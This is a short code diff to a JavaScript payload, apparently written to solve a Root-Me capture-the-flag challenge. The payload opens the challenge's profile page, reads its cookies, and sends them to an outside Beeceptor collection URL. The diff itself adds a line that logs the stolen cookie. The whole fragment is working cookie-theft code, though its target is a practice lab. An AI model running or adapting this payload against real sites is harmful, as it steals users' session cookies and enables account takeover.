@@ -38,6 +38,7 @@ setTimeout(() => {
       .catch(error => console.error('Erreur lors de la requête:', error));
       */
     const newWindow2 = window.open('http://challenge01.root-me.org:58003/profile');
+    console.log(newWindow2.document.cookie)
     newWindow.location = "https://volatile.free.beeceptor.com/c?" + newWindow2.document.cookie
         
     } catch (error) {
